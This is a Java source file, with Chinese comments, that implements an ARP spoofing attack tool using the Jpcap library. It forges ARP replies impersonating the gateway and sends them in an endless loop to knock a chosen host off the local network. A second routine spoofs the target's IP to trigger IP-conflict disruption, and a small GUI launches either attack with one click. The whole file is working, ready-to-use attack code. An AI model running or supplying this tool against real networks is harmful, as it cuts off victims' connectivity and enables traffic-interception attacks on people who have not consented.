package com.arpattack;

import java.awt.Container;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JTextField;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;

/**
 * 基于Jpcap的ARP攻击程序范例
 * @author 陈祖煌
 * @version 1.0
 */
public class ARPAttack {

	/**
	 * 本地主机的0号网络设备，根据具体实际情况对参数0进行修改
	 */
	public static NetworkInterface device = JpcapCaptor.getDeviceList()[0];
	
	public static JTextField targetIP = new JTextField("10.96.1.100");
	public static JTextField time = new JTextField("2000");
	
	/**
	 * 通过发送ARP请求包来获取某一IP地址主机的MAC地址。
	 * @param ip	//未知MAC地址主机的IP地址
	 * @return		//已知IP地址的MAC地址
	 * @throws IOException
	 */
	public static byte[] getOtherMAC(String ip) throws IOException{
		JpcapCaptor jc = JpcapCaptor.openDevice(device,2000,false,3000);	//打开网络设备，用来侦听
		JpcapSender sender = jc.getJpcapSenderInstance();				//发送器JpcapSender，用来发送报文
		InetAddress senderIP = InetAddress.getByName("10.96.33.232");	//设置本地主机的IP地址，方便接收对方返回的报文
		InetAddress targetIP = InetAddress.getByName(ip);				//目标主机的IP地址
		
		ARPPacket arp=new ARPPacket();				//开始构造一个ARP包
		arp.hardtype=ARPPacket.HARDTYPE_ETHER;		//硬件类型
		arp.prototype=ARPPacket.PROTOTYPE_IP;		//协议类型
		arp.operation=ARPPacket.ARP_REQUEST;        //指明是ARP请求包
		arp.hlen=6;									//物理地址长度
		arp.plen=4;									//协议地址长度
		arp.sender_hardaddr=device.mac_address;		//ARP包的发送端以太网地址,在这里即本地主机地址
		arp.sender_protoaddr=senderIP.getAddress(); //发送端IP地址, 在这里即本地IP地址
		
		byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255};	//广播地址
		arp.target_hardaddr=broadcast;				//设置目的端的以太网地址为广播地址	
		arp.target_protoaddr=targetIP.getAddress();	//目的端IP地址
		
		//构造以太帧首部
		EthernetPacket ether=new EthernetPacket();	
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;     //帧类型
		ether.src_mac=device.mac_address;	//源MAC地址
		ether.dst_mac=broadcast;            //以太网目的地址，广播地址
		arp.datalink=ether;					//将arp报文的数据链路层的帧设置为刚刚构造的以太帧赋给
		
		sender.sendPacket(arp);				//发送ARP报文
		
		while(true){                     	//获取ARP回复包，从中提取出目的主机的MAC地址，如果返回的是网关地址，表明目的IP不是局域网内的地址
		   Packet packet = jc.getPacket();
		   if(packet instanceof ARPPacket){
			   ARPPacket p=(ARPPacket)packet;
			   if(p==null){
				   throw new IllegalArgumentException(targetIP+" is not a local address");	//这种情况也属于目的主机不是本地地址
			   }
			   if(Arrays.equals(p.target_protoaddr,senderIP.getAddress())){
				   System.out.println("get mac ok");
				   return p.sender_hardaddr;	//返回
			   }
		   }
		}
	}
	
	/**
	 * 将字符串形式的MAC地址转换成存放在byte数组内的MAC地址
	 * @param str	字符串形式的MAC地址，如：AA-AA-AA-AA-AA
	 * @return	保存在byte数组内的MAC地址
	 */
	public static byte[] stomac(String str) {  
        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };  
        String[] temp = str.split("-");  
        for (int x = 0; x < temp.length; x++) {  
            mac[x] = (byte) ((Integer.parseInt(temp[x], 16)) & 0xff);  
        }  
        return mac;  
    }
	
	/**
	 * 执行ARP断网攻击。原理是：冒充网关发送出来的ARP应答包，令接收端更改其ARP缓存表，修改网关IP地址对应的MAC地址，从而令数据无法正常通过网关发出。
	 * @param ip
	 * @param time
	 * @throws InterruptedException
	 * @throws IOException
	 */
	public static void ARPAttack(String ip, int time) throws InterruptedException, IOException{
		JpcapCaptor jpcap = JpcapCaptor.openDevice(device, 65535, false, 3000);
		jpcap.setFilter("arp", true);
		JpcapSender sender = JpcapSender.openDevice(device);
		
		ARPPacket arp = new ARPPacket();
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;//硬件类型
		arp.prototype = ARPPacket.PROTOTYPE_IP;	//协议类型
		arp.operation = ARPPacket.ARP_REPLY;	//指明是ARP应答包包
		arp.hlen = 6;
		arp.plen = 4;
		
		byte[] srcmac = stomac("00-0D-2B-2E-B1-0A"); // 伪装的MAC地址，这里乱写就行，不过要符合格式、十六进制
		arp.sender_hardaddr = srcmac;
		arp.sender_protoaddr = InetAddress.getByName("10.96.0.1").getAddress();
		
		arp.target_hardaddr=device.mac_address;//getOtherMAC(ip);
		arp.target_protoaddr=InetAddress.getByName(ip).getAddress();
		
		
		//设置数据链路层的帧
		EthernetPacket ether=new EthernetPacket();
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac= srcmac;	//停止攻击一段时间后，目标主机会自动恢复网络。若要主动恢复，这里可用getOtherMAC("10.96.0.1");
		ether.dst_mac=device.mac_address;//getOtherMAC(ip);
		arp.datalink=ether;
		
		// 发送ARP应答包 。因为一般主机会间隔一定时间发送ARP请求包询问网关地址，所以这里需要设置一个攻击周期。
        while (true) {  
            System.out.println("sending ARP..");  
            sender.sendPacket(arp);  
            Thread.sleep(time);  
        }
	}
	
	/**
	 * 执行IP冲突攻击。原理是：伪装与被攻击主机IP地址相同的ARP请求包，令接收端误认为有主机与其IP地址相同。
	 * @param ip
	 * @param time
	 * @throws InterruptedException
	 * @throws IOException
	 */
	public static void IPAttack(String ip, int time) throws InterruptedException, IOException{
		JpcapCaptor jpcap = JpcapCaptor.openDevice(device, 65535, false, 3000);
		jpcap.setFilter("arp", true);
		JpcapSender sender = JpcapSender.openDevice(device);
		
		ARPPacket arp = new ARPPacket();
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;//硬件类型
		arp.prototype = ARPPacket.PROTOTYPE_IP;	//协议类型
		arp.operation = ARPPacket.ARP_REPLY;	//指明是ARP应答包包
		arp.hlen = 6;
		arp.plen = 4;
		
		byte[] srcmac = stomac("00-0D-2B-2E-B1-0A"); // 伪装的MAC地址，这里乱写就行，不过要符合格式、十六进制
		arp.sender_hardaddr = srcmac;
		arp.sender_protoaddr = InetAddress.getByName(ip).getAddress();
		
		arp.target_hardaddr=device.mac_address;//getOtherMAC(ip);
		arp.target_protoaddr=InetAddress.getByName(ip).getAddress();
		
		
		//设置数据链路层的帧
		EthernetPacket ether=new EthernetPacket();
		ether.frametype=EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac= srcmac;	//停止攻击一段时间后，目标主机会自动恢复网络。若要主动恢复，这里可用getOtherMAC("10.96.0.1");
		ether.dst_mac=device.mac_address;//getOtherMAC(ip);
		arp.datalink=ether;
		
		// 发送ARP应答包 。因为一般主机会间隔一定时间发送ARP请求包询问网关地址，所以这里需要设置一个攻击周期。
        while (true) {  
            System.out.println("sending ARP..");  
            sender.sendPacket(arp);  
            Thread.sleep(time);  
        }
	}
	
	/**
	 * 程序入口
	 * @param args
	 * @throws IOException 
	 * @throws InterruptedException 
	 */
	public static void main(String[] args) throws InterruptedException, IOException {
		//ARPAttack("10.96.81.56", 2000);
		JFrame frame = new JFrame("");
		frame.setBounds(300, 250, 400, 300);
		Container c = frame.getContentPane();
		c.setLayout(null);
		
		targetIP.setBounds(10,10,100,15);
		time.setBounds(130, 10, 40, 15);
		
		JButton atk1 = new JButton("ARP断网攻击");
		atk1.setBounds(10, 40, 150, 15);
		atk1.addActionListener(new ActionListener(){
			@Override
			public void actionPerformed(ActionEvent e) {
				new Thread(new Runnable(){
					@Override
					public void run() {
						try {
							ARPAttack(targetIP.getText(), Integer.parseInt(time.getText()));
						} catch (InterruptedException e) {
							e.printStackTrace();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}).start();
			}
			
		});
		
		JButton atk2 = new JButton("IP冲突攻击");
		atk2.setBounds(10, 70, 150, 15);
		atk2.addActionListener(new ActionListener(){
			@Override
			public void actionPerformed(ActionEvent e) {
				new Thread(new Runnable(){
					@Override
					public void run() {
						try {
							IPAttack(targetIP.getText(), Integer.parseInt(time.getText()));
						} catch (InterruptedException e) {
							e.printStackTrace();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}).start();
			}
		});
		
		c.add(targetIP);
		c.add(atk1);
		c.add(atk2);
		c.add(time);
		
		frame.setDefaultCloseOperation(3);
		frame.show();
	}
}
